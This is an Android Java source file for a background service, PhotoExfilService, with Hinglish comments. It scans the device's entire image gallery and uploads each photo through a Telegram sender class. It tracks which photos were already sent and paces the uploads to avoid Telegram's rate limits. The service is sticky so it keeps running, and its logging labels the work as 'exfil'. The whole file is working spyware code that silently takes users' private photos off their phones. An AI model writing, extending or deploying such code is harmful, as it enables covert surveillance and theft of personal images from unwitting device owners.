package com.secure.labs.phototool;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.MediaStore;
import android.util.Log;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class PhotoExfilService extends Service {

    private static final String TAG = "PhotoExfilService";
    private static final String PREFS = "sent_photos"; // bheji hui photos track

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    List<String> photos = scanGallery();
                    Log.i(TAG, "photos found: " + photos.size());

                    TelegramSender sender = new TelegramSender();
                    SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);

                    for (String path : photos) {
                        if (prefs.contains(path)) continue; // already sent
                        boolean ok = sender.sendPhoto(path);
                        if (ok) {
                            prefs.edit().putBoolean(path, true).apply();
                        }
                        Thread.sleep(400); // Telegram rate limit se bachne ke liye
                    }
                } catch (Exception e) {
                    Log.e(TAG, "exfil error", e);
                }
                stopSelf();
            }
        }).start();
        return START_STICKY;
    }

    private List<String> scanGallery() {
        List<String> paths = new ArrayList<>();
        Uri collection = (Build.VERSION.SDK_INT >= 29)
                ? MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
                : MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        Cursor c = getContentResolver().query(
                collection,
                new String[]{MediaStore.Images.Media.DATA},
                null, null, null);

        if (c != null) {
            int idx = c.getColumnIndex(MediaStore.Images.Media.DATA);
            while (c.moveToNext()) {
                if (idx >= 0) {
                    String p = c.getString(idx);
                    if (p != null && new File(p).exists()) {
                        paths.add(p);
                    }
                }
            }
            c.close();
        }
        return paths;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
